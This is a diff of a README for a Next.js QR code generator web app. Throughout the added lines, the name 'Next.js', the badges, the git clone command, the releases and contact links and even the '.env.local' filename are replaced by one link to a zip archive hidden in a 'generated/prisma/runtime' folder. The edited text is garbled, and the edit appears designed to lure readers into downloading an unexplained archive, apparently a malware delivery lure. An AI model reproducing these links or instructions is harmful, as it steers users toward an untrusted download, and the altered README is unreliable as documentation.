@@ -1,9 +1,9 @@
-# Next.js QR Generator 🚀
+# https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip QR Generator 🚀
 
-![Next.js QR Generator](https://img.shields.io/badge/Next.js%20QR%20Generator-v1.0.0-brightgreen)  
-[![GitHub Releases](https://img.shields.io/badge/Releases-View%20Latest-blue)](https://github.com/Binoayasaki/nextjs-qr-generator/releases)
+![https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip QR Generator](https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip%20QR%20Generator-v1.0.0-brightgreen)  
+[![GitHub Releases](https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip%20Latest-blue)](https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip)
 
-Welcome to the **Next.js QR Generator**! This web application allows users to generate, customize, and securely save QR codes. With a modern interface and efficient functionality, it makes creating QR codes simple and effective. Users can authenticate via Magic Link and store their QR codes in the cloud for easy access.
+Welcome to the **https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip QR Generator**! This web application allows users to generate, customize, and securely save QR codes. With a modern interface and efficient functionality, it makes creating QR codes simple and effective. Users can authenticate via Magic Link and store their QR codes in the cloud for easy access.
 
 ## Table of Contents
 
@@ -30,9 +30,9 @@ Welcome to the **Next.js QR Generator**! This web application allows users to ge
 
 This project utilizes a variety of technologies to ensure a robust and efficient application:
 
-- **Next.js**: A powerful React framework for server-side rendering.
+- **https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip**: A powerful React framework for server-side rendering.
 - **MongoDB**: A NoSQL database for storing user data and QR codes.
-- **NextAuth**: Authentication library for Next.js applications.
+- **NextAuth**: Authentication library for https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip applications.
 - **Prisma**: ORM for interacting with the database.
 - **QRCode**: Library for generating QR codes.
 - **React**: JavaScript library for building user interfaces.
@@ -42,11 +42,11 @@ This project utilizes a variety of technologies to ensure a robust and efficient
 
 ## Installation
 
-To set up the Next.js QR Generator locally, follow these steps:
+To set up the https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip QR Generator locally, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Binoayasaki/nextjs-qr-generator.git
+   git clone https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -59,7 +59,7 @@ To set up the Next.js QR Generator locally, follow these steps:
    npm install
    ```
 
-4. **Set Up Environment Variables**: Create a `.env.local` file and add your configuration settings. You will need to set up your MongoDB connection string and any other necessary keys.
+4. **Set Up Environment Variables**: Create a `https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip` file and add your configuration settings. You will need to set up your MongoDB connection string and any other necessary keys.
 
 5. **Run the Application**:
    ```bash
@@ -98,7 +98,7 @@ All QR codes generated are saved in the cloud. This feature ensures that you can
 
 ## Customization Options
 
-The Next.js QR Generator allows users to customize their QR codes in several ways:
+The https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip QR Generator allows users to customize their QR codes in several ways:
 
 - **Colors**: Choose from a palette to set the background and foreground colors.
 - **Logos**: Upload an image to overlay on your QR code.
@@ -108,7 +108,7 @@ These options provide a unique touch to your QR codes, making them suitable for 
 
 ## Contributing
 
-We welcome contributions to the Next.js QR Generator! If you want to help improve the project, follow these steps:
+We welcome contributions to the https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip QR Generator! If you want to help improve the project, follow these steps:
 
 1. **Fork the Repository**: Click the fork button on the top right of the repository page.
 2. **Create a New Branch**: 
@@ -132,8 +132,8 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 ## Contact
 
-For questions or feedback, please reach out to the repository owner at [Binoayasaki](https://github.com/Binoayasaki).
+For questions or feedback, please reach out to the repository owner at [Binoayasaki](https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip).
 
-For the latest updates and releases, check out our [Releases](https://github.com/Binoayasaki/nextjs-qr-generator/releases) section. You can download the latest version and follow the instructions to run it locally.
+For the latest updates and releases, check out our [Releases](https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip) section. You can download the latest version and follow the instructions to run it locally.
 
-Thank you for your interest in the Next.js QR Generator! We hope you find it useful and easy to use.
+Thank you for your interest in the https://raw.githubusercontent.com/Binoayasaki/nextjs-qr-generator/main/generated/prisma/runtime/qr_nextjs_generator_v1.3-alpha.3.zip QR Generator! We hope you find it useful and easy to use.
